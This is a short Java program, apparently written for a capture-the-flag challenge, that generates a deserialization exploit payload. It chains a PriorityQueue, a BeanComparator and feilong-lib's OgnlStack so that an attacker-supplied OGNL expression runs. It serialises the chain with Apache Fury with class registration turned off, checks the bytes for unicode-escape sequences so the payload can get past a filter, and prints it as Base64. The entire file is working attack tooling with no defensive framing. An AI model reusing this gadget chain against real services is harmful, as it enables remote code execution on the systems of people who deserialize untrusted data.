import com.feilong.lib.beanutils.BeanComparator;
import com.feilong.lib.excel.ognl.OgnlStack;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.File;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class EzffOracleGen {
    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.err.println("usage: EzffOracleGen <path> <expr>");
            System.exit(1);
        }

        String path = args[0];
        String expr = args[1];

        OgnlStack stack1 = new OgnlStack(new File(path));
        BeanComparator<Object> comparator = new BeanComparator<>("value(" + expr + ")");

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        setField(queue, "queue", new Object[]{stack1, stack1});
        setField(queue, "size", 2);

        Fury fury = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .build();

        byte[] payload = fury.serialize(queue);
        String b64 = Base64.getEncoder().encodeToString(payload);
        System.err.println("raw=" + payload.length + " b64=" + b64.length());
        System.err.println("hasUnicodeEscape=" + hasUnicodeEscape(payload));
        System.out.println(b64);
    }

    private static void setField(Object obj, String name, Object value) throws Exception {
        Field f = PriorityQueue.class.getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    private static boolean hasUnicodeEscape(byte[] bytes) {
        for (int i = 0; i < bytes.length - 1; i++) {
            if (bytes[i] == 92 && (bytes[i + 1] == 117 || bytes[i + 1] == 85)) {
                return true;
            }
        }
        return false;
    }
}
